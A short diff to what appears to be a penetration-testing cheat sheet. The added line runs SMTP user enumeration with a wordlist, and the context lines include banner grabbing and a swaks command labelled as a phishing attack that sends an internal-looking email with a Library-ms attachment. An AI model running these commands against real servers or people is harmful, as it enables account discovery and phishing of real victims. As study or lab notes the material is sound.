@@ -962,6 +962,7 @@ nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the info
 ```powershell
 nc -nv <IP> 25 #Version Detection
 smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
 
 #Sending email with valid credentials, the below is an example of Phishing mail attack
 sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
